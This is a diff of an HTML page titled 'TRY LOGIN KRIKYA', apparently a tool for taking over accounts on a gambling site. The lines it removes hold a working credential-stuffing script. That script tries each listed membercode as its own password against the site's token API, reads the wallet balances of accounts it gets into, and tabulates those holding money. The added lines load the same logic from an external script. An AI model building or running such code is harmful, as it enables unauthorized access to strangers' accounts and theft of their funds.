@@ -2,13 +2,11 @@
 <html lang="en" data-bs-theme="dark">
 
 <head>
-    <title>TRY LOGIN</title>
+    <title>TRY LOGIN KRIKYA</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
-    <script src="https://formspree.io/js/formbutton-v1.min.js" defer></script>
-    <link rel="icon" href="https://hckrxyzz.github.io/image/myLogo.png" type="image/png">
     <style>
         body {
             margin: 0;
@@ -18,6 +16,12 @@
 
         .btnContainer {
             width: 300px;
+        }
+
+        .sidebarIcon {
+            max-width: 20px;
+            max-height: 30px;
+            background-image: url("");
         }
 
         #fileContent {
@@ -56,10 +60,6 @@
         }
 
         .word-item {
-            border: 1px solid #3b3b3b;
-            text-align: left;
-            margin: 1px;
-            padding: 5px;
             text-shadow: 1px 1px 1px #070707;
         }
 
@@ -227,9 +227,12 @@
 </head>
 
 <body>
-    <header class="fixed-top container-fluid bg-dark navbar-dark">
-        <button class="btn btn-outline-info" type="button" data-bs-toggle="offcanvas"
-            data-bs-target="#sidebar">≡</button>
+    <header class="fixed-top container-fluid bg-dark border">
+        <button class="btn btn-menu" type="button" data-bs-toggle="offcanvas" data-bs-target="#sidebar">
+            <div class="sidebarIcon">
+                <img src="sidebaricon.svg" type="image/svg" width="100" alt="sidebar">
+            </div>
+        </button>
         <button type="button" class="btn btn-outline-danger" id="stopButton">STOP</button>
 
     </header>
@@ -246,7 +249,8 @@
                         <!-- File content will be displayed here -->
                     </div>
                 </div>
-                <div class="word-container container shadow border">
+                <div class="container-fluid mt-3" style="margin-bottom: 100px;">
+                    <h2 class="bg-danger text-center text-dark text-shadow">INPUT MEMBERCODES</h2>
                     <div id="wordListContainer"></div>
                 </div>
                 <div class="modal-footer">
@@ -268,31 +272,6 @@
         <div class="offcanvas-body btnContainer d-grid btn-group-vertical gap-3" id="btnContainer">
             <button id="btn6" type="button" class="btn btn-outline-primary">Button 6</button>
             <button class="btn btn-secondary" type="button">AButton</button>
-            <button type="button" class="btn btn-outline-primary">Primary</button>
-            <button type="button" class="btn btn-outline-secondary">Secondary</button>
-            <button type="button" class="btn btn-outline-success">Success</button>
-            <button type="button" class="btn btn-outline-info">Info</button>
-            <button type="button" class="btn btn-outline-danger">Danger</button>
-            <button type="button" class="btn btn-outline-dark">Dark</button>
-            <button type="button" class="btn btn-outline-light text-dark">Light</button>
-            <button type="button" class="btn">Basic</button>
-            <button type="button" class="btn btn-primary">Primary</button>
-            <button type="button" class="btn btn-secondary">Secondary</button>
-            <button type="button" class="btn btn-success">Success</button>
-            <button type="button" class="btn btn-info">Info</button>
-            <button type="button" class="btn btn-warning">Warning</button>
-            <button type="button" class="btn btn-danger">Danger</button>
-            <button type="button" class="btn btn-dark">Dark</button>
-            <button type="button" class="btn btn-light">Light</button>
-            <button type="button" class="btn btn-link">Link</button>
-            <a href="#" class="btn btn-success">Link Button</a>
-            <button type="button" class="btn btn-success">Button</button>
-            <input type="button" class="btn btn-success" value="Input Button">
-            <input type="submit" class="btn btn-success" value="Submit Button">
-            <input type="reset" class="btn btn-success" value="Reset Button">
-            <button type="button" class="btn btn-primary btn-lg">Large</button>
-            <button type="button" class="btn btn-primary">Default</button>
-            <button type="button" class="btn btn-primary btn-sm">Small</button>
             <button type="button" class="btn btn-primary btn-block">Full-Width Button</button>
             <button type="button" class="btn btn-primary active">Active Primary</button>
         </div>
@@ -304,10 +283,11 @@
             <input type="file" id="fileInput" accept=".txt">
             <input type="button" class="btn btn-close" onclick="clearInput()" title="clearInput">
             <label for="textInput"></label>
-            <textarea id="textInput" class="container-fluid" placeholder="Paste your text here..."></textarea>
-            <div class="container-fluid border shadow text-start shadow btn btn-outline-success">
+            <textarea id="textInput" class="container-fluid bg-black shadow border-radius border" spellcheck="false"
+                placeholder="Paste your text here..."></textarea>
+            <div class="container-fluid text-start btn btn-outline-success">
                 <div id="memberStats" class="stats"></div>
-                <div id="userList"></div>
+                <div class="container-fluid" id="userList"></div>
                 <div id="wordStats"></div>
             </div>
         </div>
@@ -319,7 +299,7 @@
             <div class="container-fluid border">
                 <table class="table table-bordered table-dark table-hover table-bordered table-stripe">
                     <thead>
-                        <tr>
+                        <tr class="text-center table-danger">
                             <th>USERNAME</th>
                             <th>WALLET</th>
                             <th>BALANCE</th>
@@ -327,207 +307,50 @@
                     </thead>
                     <tbody id="tableBody">
                         <tr>
-                            <td>membercode</td>
-                            <td>main</td>
-                            <td>0.000000</td>
+                            <td>↺</td>
+                            <td>↺</td>
+                            <td>↻</td>
                         </tr>
                     </tbody>
                 </table>
-                <div class="container-fluid border shadow text-center bg-primary">
-                    <h5 class="text-info">SUCCESSFULL MEMBERCODES</h5>
+                <div class="container-fluid mt-3" style="margin-bottom: 100px;">
+                    <h2 class="bg-danger text-center text-dark text-shadow">SUCCESSFULL MEMBERCODES</h2>
+                    <div class="row" id="successOutput"></div>
                 </div>
-                <div id="successOutput" class="container-fluid border" style="column-count: 5; margin-top: 10px;"></div>
-            </div>
-            <!-- Logo Popup Modal -->
-            <div class="modal fade" id="logoModal" tabindex="-1" aria-labelledby="logoModalLabel" aria-hidden="true">
-                <div class="modal-dialog modal-dialog-centered">
-                    <div class="modal-content bg-dark text-center">
-                        <div class="modal-header border-0">
-                            <h5 class="modal-title w-100" id="logoModalLabel"></h5>
-                            <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"
-                                aria-label="Close"></button>
-                        </div>
-                        <div class="modal-body">
-                            <div class="logoContainer">
-                                <img class="rounded" id="myLogo" src="https://hckrxyzz.github.io/image/myLogo.svg"
-                                    alt="img" style="width:400px;">
-                            </div>
-                        </div>
+                <footer class="fixed-bottom">
+                    <div class="mt-5 p-4 text-center">
+                        <input type="button" class="btn btn-outline-danger mainButton" id="mainButton" title="MAIN"
+                            value="▢">
                     </div>
-                </div>
-            </div>
-        </div>
-    </main>
-    <footer class="fixed-bottom">
-        <div class="mt-5 p-4 text-center">
-            <input type="button" class="btn btn-outline-danger mainButton" id="mainButton" title="MAIN" value="▢">
-        </div>
-    </footer>
+                </footer>
 
-    <script>
-        document.getElementById('fileInput').addEventListener('change', function (event) {
-            const file = event.target.files[0];
-            if (file) {
-                const reader = new FileReader();
-                reader.onload = function (e) {
-                    document.getElementById('fileContent').innerText = e.target.result;
-                };
-                reader.readAsText(file);
-                const modal = new bootstrap.Modal(document.getElementById('inputViewer'));
-                modal.show();
-            }
-        });
-        function clearInput() {
-            document.getElementById('fileInput').value = "";
-            document.getElementById('textInput').value = "";
-        }
-    </script>
-    <script>
-        function popupMyphoto() {
-            const logoModal = new bootstrap.Modal(document.getElementById('logoModal'));
-            logoModal.show();
-        };
-    </script>
-    <script>
-        let stopRequested = false;
-        let successfulLogins = [];
-
-        function fetchUsernamesFromProcessedList() {
-            const wordListContainer = document.getElementById('wordListContainer');
-            const usernames = [];
-            if (wordListContainer) {
-                wordListContainer.querySelectorAll('.word-item').forEach(div => {
-                    usernames.push(div.textContent.trim());
-                });
-            }
-            return usernames;
-        }
-
-        async function tryLogin(username) {
-            if (stopRequested) return null;
-
-            const loginData = {
-                domain: "https://www.krikya11.com",
-                membercode: username,
-                password: username,
-                platform: "desktop",
-                option: "2",
-            };
-
-            let loginResponse, loginResult;
-            try {
-                loginResponse = await fetch("https://feapi.sharky777.xyz/api/token", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify(loginData),
-                });
-                loginResult = await loginResponse.json();
-            } catch (error) {
-                console.log(`Network error for ${username}:`, error);
-                return;
-            }
-
-            if (loginResponse.ok) {
-                await fetchWalletDetails(loginResult.access_token, username);
-            } else {
-                console.log(`Login failed: ${username}`);
-            }
-        }
-        async function fetchWalletDetails(token, username) {
-            if (stopRequested) return;
-
-            const response = await fetch(
-                "https://feapi.sharky777.xyz/api/member/wallets", {
-                method: "GET",
-                headers: {
-                    Authorization: `Bearer ${token}`
-                },
-            }
-            );
-
-            const result = await response.json();
-            if (response.ok) {
-                const wallets = result.data.wallets.map((wallet) => ({
-                    code: wallet.wallet_code,
-                    balance: wallet.balance
-                }));
-                displaySuccessResponse(username, wallets);
-
-                const tableBody = document.getElementById("tableBody");
-                wallets.forEach(wallet =>  {
-                    if (parseFloat(wallet.balance) >= 1) {
-                        const tr = document.createElement('tr');
-                        tr.innerHTML = `<td>${username}</td><td>${wallet.code}</td><td>${wallet.balance}</td>`;
-                        tableBody.appendChild(tr);
+                <script>
+                    document.getElementById('fileInput').addEventListener('change', function (event) {
+                        const file = event.target.files[0];
+                        if (file) {
+                            const reader = new FileReader();
+                            reader.onload = function (e) {
+                                document.getElementById('fileContent').innerText = e.target.result;
+                            };
+                            reader.readAsText(file);
+                            const modal = new bootstrap.Modal(document.getElementById('inputViewer'));
+                            modal.show();
+                        }
+                    });
+                    function clearInput() {
+                        document.getElementById('fileInput').value = "";
+                        document.getElementById('textInput').value = "";
                     }
-                });
+                </script>
+                <script>
+                    function popupMyphoto() {
+                        const logoModal = new bootstrap.Modal(document.getElementById('logoModal'));
+                        logoModal.show();
+                    };
+                </script>
 
-                successfulLogins.push({
-                    username,
-                    wallets
-                });
-            }
-        }
-
-        function displaySuccessResponse(username, wallets) {
-            successfulLogins.push(username);
-            localStorage.setItem('success', successfulLogins.map(u => typeof u === 'string' ? u : u.username).join(','));
-            const successOutput = document.getElementById("successOutput");
-            let ol = successOutput.querySelector('ol');
-            if (!ol) {
-                ol = document.createElement('ol');
-                successOutput.innerHTML = '';
-                successOutput.appendChild(ol);
-            }
-            const li = document.createElement('li');
-            li.textContent = username;
-            ol.appendChild(li);
-        }
-        function createUserBalanceDiv(username, balance) {
-            const tableBody = document.getElementById("tableBody");
-            const tr = document.createElement('tr');
-            tr.innerHTML = `<td>${username}</td> <td>${balance}</td>`;
-            tableBody.appendChild(tr);
-        }
-
-        const mainButton = document.getElementById('mainButton');
-        const stopButton = document.getElementById('stopButton');
-
-        mainButton.addEventListener('click', () => {
-            processLoginFile()
-        });
-
-        stopButton.addEventListener('click', () => {
-            stopLoginAttempts();
-        });
-
-        async function processLoginFile() {
-            stopRequested = false;
-            successfulLogins = [];
-            const usernames = fetchUsernamesFromProcessedList();
-            for (const username of usernames) {
-                if (stopRequested) {
-                    console.log("STOPPED");
-                    alert("STOPPED");
-                    return;
-                }
-                try {
-                    await tryLogin(username);
-                } catch (error) {
-                    console.log(error);
-                }
-            }
-            alert("Login process finished!");
-        }
-
-
-        function stopLoginAttempts() {
-            stopRequested = true;
-        }
-    </script>
-    <script src="https://hckrxyzz.github.io/js/wordgenarate.js"></script>
+                <script src="https://hckrxyzz.github.io/js/wordgenarate.js"></script>
+                <script src="https://hckrxyzz.github.io/js/krikyatrylogin.js"></script>
 </body>
 
 </html>
